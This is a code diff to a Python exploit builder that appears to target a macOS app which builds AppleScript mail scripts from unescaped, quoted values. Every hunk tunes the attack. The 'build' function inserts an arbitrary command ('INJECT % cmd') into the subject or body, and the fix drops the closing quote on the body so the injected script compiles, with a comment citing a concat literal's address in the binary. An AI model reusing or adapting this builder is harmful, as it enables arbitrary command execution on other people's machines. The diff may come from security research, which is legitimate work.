@@ -72,7 +72,7 @@ class Binary:
 
 
 def quoted(v: str) -> str:
-    """The app wraps every value in a bare quote and never escapes it."""
+    """The app writes a LEADING bare quote and, for the record keys, a TRAILING one."""
     return '"' + v + '"'
 
 
@@ -80,7 +80,11 @@ def build(binary: Binary, cmd: str, inject_into: str = 'body') -> str:
     L = {k: binary.cstr(v) for k, v in VADDRS.items()}
     payload = INJECT % cmd
     subject = quoted(payload if inject_into == 'subject' else 'Invoice')
-    body = quoted(payload if inject_into == 'body' else 'See attached.')
+    # The body gets a LEADING quote only: the concat literal at 0x100dc71a0
+    # ('" & linefeed & linefeed') supplies the closing quote. Wrapping the body in
+    # two quotes emits one extra `"` and the script fails to compile with
+    # "Expected , or } but found end of line" — measured on a macOS runner.
+    body = '"' + (payload if inject_into == 'body' else 'See attached.')
     return ''.join([
         L['tos'], quoted('test@example.com'), '\n',
         L['ccs'], quoted(''), '\n',
